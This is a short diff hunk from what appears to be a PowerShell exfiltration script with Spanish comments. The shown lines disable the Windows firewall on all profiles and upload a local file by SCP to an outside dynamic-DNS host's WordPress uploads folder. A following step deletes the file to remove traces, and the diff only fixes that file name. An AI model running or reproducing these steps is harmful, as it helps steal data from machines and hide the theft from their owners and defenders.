@@ -31,4 +31,4 @@ netsh advfirewall set allprofiles state off
 Set-SCPFile –ComputerName dominio.duckdns.org –Port 3333  –RemotePath /home/usuario/Wordpress/wp-content/uploads/2019 –LocalFile $lul/lel.txt
 
 ## Borrado del archivo
-rm $lul/lel.
+rm $lul/lel.txt
